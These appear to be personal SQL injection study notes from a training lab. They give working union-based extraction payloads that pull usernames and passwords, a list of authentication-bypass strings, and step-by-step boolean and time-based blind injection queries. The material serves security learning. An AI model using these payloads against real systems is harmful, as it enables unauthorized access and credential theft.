# SQLi 
reeeee

Easy way to enumerate columns with order
`id=1 order by 1`
Then we can increment the by NUMBER until we receieve an error indicating the number of correct columns


### Unions
A union must select the **same** number of fields as the first select statement

`SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;`


DONT BE AFRAID TO USE NULL AS A PLACEHOLDER
#### Union SQLi

Steps to find union sql statement with no protections
1. Complete the statement with an UNION SELECT 1
	1. Append more select objects until it completes, might be easier to use NULL or a function such as database()
	2. if the statement has the correct number of fields, it will not error and display the results to the page
2. Grab the list of tables
	1. ``UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'``
3. Grab the columns of the table you desire, most often a user table
	1. ``UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'``
4. Grab info from the tables using the revealed columns
	1. `UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`

Things for certain
- This only works if the fields in the talble the select statement is grabbing from is known
- group_concat() is based asf


### Authentication bypass

The trick is to make the query always return **true** regardless of what is actually inputted

Example sql query in a login form:

`select * from users where username='%username%' and password='%password%' LIMIT 1;`

injection

`' OR 1=1;--`

will turn the query into

`select * from users where username='' and password='' OR 1=1;--' LIMIT 1;`

list from OWASP
```
or 1=1  
or 1=1--  
or 1=1#  
or 1=1/*  
admin' --  
admin' #  
admin'/*  
admin' or '1'='1  
admin' or '1'='1'--  
admin' or '1'='1'#  
admin' or '1'='1'/*  
admin'or 1=1 or ''='  
admin' or 1=1  
admin' or 1=1--  
admin' or 1=1#  
admin' or 1=1/*  
admin') or ('1'='1  
admin') or ('1'='1'--  
admin') or ('1'='1'#  
admin') or ('1'='1'/*  
admin') or '1'='1  
admin') or '1'='1'--  
admin') or '1'='1'#  
admin') or '1'='1'/*  
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055  
admin" --  
admin" #
admin'||''==='
admin"/*  
admin" or "1"="1  
admin" or "1"="1"--  
admin" or "1"="1"#  
admin" or "1"="1"/*  
admin"or 1=1 or ""="  
admin" or 1=1  
admin" or 1=1--  
admin" or 1=1#  
admin" or 1=1/*  
admin") or ("1"="1  
admin") or ("1"="1"--  
admin") or ("1"="1"#  
admin") or ("1"="1"/*  
admin") or "1"="1  
admin") or "1"="1"--  
admin") or "1"="1"#  
admin") or "1"="1"/*  
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```


### Blind SQLi

#### Boolean based

Basically the idea is that the application will respond as normal given the SQLi is right, which is the idea of *Boolean*

Query to guess against:
`select * from users where username = '%username%' LIMIT 1;`

Steps to do boolean sqli
1. Find the number of columns with a union select
	1. `admin123' UNION SELECT 1;--`
		1. this returns false because they are more than one column
	2. Add values until its true
		1. `admin123' UNION SELECT 1,2,3;--`
		2. This returns true because they are three columns
2. Guess the database name(this probably could be automated nicely)
	1. `admin123' UNION SELECT 1,2,3 where database() like '%';--`
		1. This returns true, but to guess the database name add letters before the '%' which will return true if the letter exists in the right place
		2. for example the database in the example is "sqli_three" so the statement that would return true is
			1. `admin123' UNION SELECT 1,2,3 where database() like 'sqli_three%';--`
3. Guess tables using the same method practically
	1. `admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'LETTERS%';--` 
	2. You could guess the users table for example
4. Guess columns in found table in found database
	1. `admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`
	2. Once you've discovered one column you must append it to the statement in a NOT statement so you don't loop over the same column you've just discovered
	3. `admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`
	4. Once you've discovered the important columns like id, username, and password you can construct your payload
5. Construct payload
	1. `admin123' UNION SELECT 1,2,3 from users where username like 'a%`
		1. Discover user 'admin'
	2. Guess password
		1. `admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%`
6. Success!

#### Time based
Idea is that you can add SLEEP()s that will determine whether or not an injection exists because it will make the application sleep and return later at the specified time

1. Find the number of columns in the table with some sleeps
	1. `admin123' UNION SELECT SLEEP(5);--`
	2. Which would sleep if there was one column but in the example it doesnt because they are two columns
2. `admin123' UNION SELECT SLEEP(5),2;--`
	1. This sleeps
3. Repeat the same process in boolean to guess database, table, and column, then user and password.  Except instead of an API response guiding you, use the sleep times

